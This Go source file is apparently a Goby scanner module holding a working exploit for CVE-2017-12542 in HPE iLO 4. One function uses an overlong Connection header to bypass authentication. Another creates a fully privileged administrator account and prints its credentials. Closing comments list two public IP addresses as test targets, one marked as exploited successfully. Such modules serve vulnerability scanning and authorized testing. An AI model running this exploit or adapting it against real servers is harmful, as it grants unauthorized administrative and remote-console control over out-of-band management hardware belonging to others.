package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HP iLO4 Login Authentication Bypass (CVE-2017-12542)",
    "Description": "A vulnerability has been discovered in HPE Integrated Lights-Out 4 (iLO 4) servers, which could allow for remote code execution. HPE iLO 4 is an embedded server management tool used for out-of-band management. ",
    "Product": "HP_iLO4",
    "Homepage": "https://support.hpe.com/",
    "DisclosureDate": "2021-06-11",
    "Author": "Coco413",
    "GobyQuery": "header=\"HP-iLO-Server\"",
    "Level": "3",
    "Impact": "<p>Successful exploitation of this vulnerability could result in remote code execution or authentication bypass. Successful exploitation of the vulnerability could result in the extraction of plaintext passwords, addition of an administrator account, execution of malicious code, or replacement of iLO firmware.</p>",
    "Recommendation": "<p>Verify no unauthorized system modifications have occurred on system before applying patch.</p>",
    "References": [
        "https://www.freebuf.com/vuls/167124.html"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "Login loginauthentication bypass"
    ],
    "CVEIDs": [
        "CVE-2017-12542"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "HP_iLO4"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10213"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/rest/v1/AccountService/Accounts"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Connection", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Oem") && strings.Contains(resp.Utf8Html,
					"ManagerAccount")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomStr := goutils.RandomHexString(8)
			uri := "/rest/v1/AccountService/Accounts"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Connection", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf(`{"UserName": "%s", "Password": "%s", "Oem": {"Hp": {"Privileges": {"RemoteConsolePriv": true, "iLOConfigPriv": true, "VirtualMediaPriv": true, "UserConfigPriv": true, "VirtualPowerAndResetPriv": true, "LoginPriv": true}, "LoginName": "%s"}}}`, randomStr, randomStr, randomStr)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "MessageID") && strings.Contains(resp.Utf8Html,
					".Created") {
					// fmt.Println(resp.Utf8Html)
					expResult.Output = fmt.Sprintf("Create Account:%s / Password: %s\nAfter login you can click 'Remote Console' to see how to open a remote console", randomStr, randomStr)
					expResult.Success = true
				} else if strings.Contains(resp.Utf8Html, "reateLimitReachedForResource") {
					fmt.Println(resp.Utf8Html)
					expResult.Output = "Vuln exist, but add user api CreateLimitReachedForResource"
					expResult.Success = false
				}
			}
			return expResult
		},
	))
}

// Test URL A: https://172.118.181.66:4433 (success)
// Test URL B: https://109.172.129.245:9999(poc ok, exp create limit over)
